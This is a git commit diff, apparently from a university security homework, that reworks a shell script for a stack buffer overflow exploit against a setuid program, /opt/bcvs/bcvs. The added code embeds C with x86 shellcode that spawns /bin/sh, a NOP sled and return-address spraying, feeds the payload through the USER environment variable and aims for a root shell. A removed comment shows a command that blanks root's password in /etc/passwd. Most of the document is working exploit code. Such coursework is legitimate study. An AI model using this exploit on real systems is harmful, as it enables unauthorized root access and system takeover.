1063e852fa77c8687cc9571a9ce837d8b837cdc4
Ethan Waytas <nagell2008@x-134-84-134-126.uofm-secure.wireless.umn.edu>
2012-10-01 12:47:55 -0500

    cleaning up 6

--- hw1/sploit6/sploit6.sh
+++ hw1/sploit6/sploit6.sh
@@ -13,28 +13,95 @@
 # overflow in the copyFile function.
 ## ----------------------------------------------------- ##
 
+EXPLOIT_EXE="./exploit"
+SPLOIT_DIR="sploit6_dir"
+
 # Setup necessary environment
-gcc -o exploit exploit.c
-mkdir -p sploit6_dir
-cd sploit6_dir
+
+rm -rf $SPLIOT_DIR
+mkdir -p $SPLOIT_DIR
+cd $SPLOIT_DIR
 mkdir -p .bcvs
 touch .bcvs/block.list
+touch .bcvs/blah
 
-## Saving some stuff for later
-# Following will give the root user no password
-# cat /etc/passwd | sed 's/root:[^:]*:\(.*\)/root::\1/'
+cat <<EOS > "exploit.c"
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
 
-SHELL_CODE=$(../exploit)
-#echo "$SHELL_CODE"
+#define DEFAULT_OFFSET 0
+#define DEFAULT_BSIZE 256
+#define NOP 0x90
+
+// Shellcode for exec of /bin/sh
+char shellcode[] = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80"
+"\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80"
+"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";
+
+
+unsigned long get_sp(void) {
+  __asm__("movl %esp, %eax");
+}
+
+void main(int argc, char* argv[]) {
+  char buff[DEFAULT_BSIZE];
+  char *ptr;
+  long *long_ptr, addr;
+  int i = 0;
+  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BSIZE;
+
+  if (argc > 1) offset = atoi(argv[1]);
+
+  addr = get_sp() - offset;
+
+
+  ptr = buff;
+
+  long_ptr = (long *) (ptr);
+  //First we fill the buffer with our best guess of the address for
+  //the buffer in the attacked program
+  for (i = 0; long_ptr < (buff + 60); i += 4) {
+	*(long_ptr++) = addr;
+  }
+
+  // Setup the nop sled
+  char *buf_ptr = (char *) (ptr + 60); 
+  for (i = (buff + 60); i < (buff + bsize); ++i) {
+    *(buf_ptr++) = NOP;
+    //buff[i] = NOP;
+  }
+
+  // Insert our shellcode
+  ptr = (buff + 186);
+  for (i = 0; i < strlen(shellcode); ++i) {
+    *(ptr++) = shellcode[i];
+  }
+
+  buff[bsize-1] = '\0';
+  printf(buff);
+  return;
+}
+
+EOS
+
+
+
+gcc -o exploit exploit.c
+
+SHELL_CODE=$($EXPLOIT_EXE)
 
 OFFSET=100
-echo "Trying offset: $OFFSET"
-SHELL_CODE=$(../exploit $OFFSET)
+
+SHELL_CODE=$($EXPLOIT_EXE $OFFSET)
 #/opt/bcvs/bcvs ci "${SHELL_CODE}"
 export USER=${SHELL_CODE}
 export PATH=""
 echo ${USER}
 echo ${PATH}
 
-/usr/bin/gdb /opt/bcvs/bcvs
+echo "junk" > "dummy_input"
+
+/opt/bcvs/bcvs co blah < dummy_input
+
 # And then hopefully you have a root shell at this point
